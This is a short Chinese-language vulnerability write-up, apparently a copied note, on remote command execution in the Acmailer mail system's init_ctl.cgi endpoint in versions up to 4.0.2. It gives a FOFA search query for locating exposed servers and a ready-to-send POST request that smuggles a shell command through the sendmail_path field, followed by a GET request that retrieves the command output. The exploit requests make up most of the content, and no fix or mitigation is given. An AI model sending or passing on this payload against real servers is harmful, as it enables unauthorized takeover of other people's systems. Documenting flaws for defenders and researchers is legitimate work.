# Acmailer邮件系统init_ctl存在远程命令执行漏洞

# 一、漏洞简介
Acmailer 是一款用于支持邮件服务的CGI软件。Acmailer邮件系统 init_ctl.cgi接口处远程命令执行,攻击者可通过此漏洞获取服务器权限。

# 二、影响版本
+ Version≤Acmailer 4.0.2

# 三、资产测绘
+ fofa`body="CGI acmailer"`
+ 特征

![1708963927312-b5ae3848-2277-44b8-b799-6ef34544756b.png](./img/WasJxdH_XZeC7KZp/1708963927312-b5ae3848-2277-44b8-b799-6ef34544756b-033862.png)

# 四、漏洞复现
```plain
POST /init_ctl.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 150
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id > 13619.txt | bash&homeurl=http://&mypath=e
```

![1708963961029-9e3fb68f-505d-474c-a060-38ff45f7e2db.png](./img/WasJxdH_XZeC7KZp/1708963961029-9e3fb68f-505d-474c-a060-38ff45f7e2db-076657.png)

获取命令执行结果

```plain
GET /13619.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Cookie: sid=a6d9c99e3ae98d10ee34acc24af3f536
Accept-Encoding: gzip, deflate
```

![1708963996773-62feb337-c501-4d6c-8e66-47953f68b34d.png](./img/WasJxdH_XZeC7KZp/1708963996773-62feb337-c501-4d6c-8e66-47953f68b34d-017278.png)



> 更新: 2024-02-29 23:57:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wanndz3h73av7n0s>